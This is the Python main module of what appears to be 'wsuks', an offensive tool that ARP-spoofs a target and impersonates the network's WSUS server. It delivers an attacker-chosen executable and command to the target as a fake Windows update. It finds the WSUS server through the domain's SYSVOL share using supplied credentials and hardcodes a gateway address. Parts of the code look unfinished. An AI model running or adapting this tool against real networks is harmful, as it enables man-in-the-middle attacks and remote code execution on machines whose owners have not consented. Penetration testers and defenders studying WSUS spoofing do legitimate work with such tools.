#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import os
import time
from scapy.all import get_if_addr, conf, sniff
from wsuks.helpers.arpspoofer import ArpSpoofer
from wsuks.helpers.logger import initLogger
from wsuks.helpers.argparser import initParser, printBanner
from wsuks.helpers.sysvolparser import SysvolParser
from wsuks.helpers.wsusserver import WSUSUpdateHandler


class Wsuks:
    def __init__(self, args):
        self.logger = logging.getLogger()
        self.hostIp = get_if_addr(conf.iface)

        # Set args
        self.targetIp = args.targetIp  # Never None (required)
        self.executable_file = args.executable.read()
        self.executable_name = os.path.basename(args.executable.name)
        args.executable.close()
        self.command = args.command

        self.wsusIp = args.wsusIp
        self.wsusPort = args.wsusPort  # Default 8530
        self.username = args.username
        self.password = args.password
        self.domain = args.domain
        self.dcIp = args.dcIp

    def run(self):
        # Get the WSUS server IP and Port from the sysvol share
        sysvolparser = SysvolParser()
        if not self.wsusIp:
            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
        else:
            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")

        # Start Arp Spoofing
        arpspoofer = ArpSpoofer()
        arpspoofer.start(self.targetIp, "192.168.0.1")
        
        # Restlicher Code
        #sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
        update_handler.set_filedigest()
        update_handler.set_resources_xml(self.command)
        try:
            time.sleep(10000)
        except KeyboardInterrupt:
            print("")
            arpspoofer.stop()

    def handlePacket(self, packet):
        packet.show()

def main():
    # Setup
    printBanner()
    args = initParser()
    initLogger(debug=args.debug)
    logger = logging.getLogger()
    logger.debug(args)

    wsuks = Wsuks(args)
    wsuks.run()


if __name__ == '__main__':
    main()
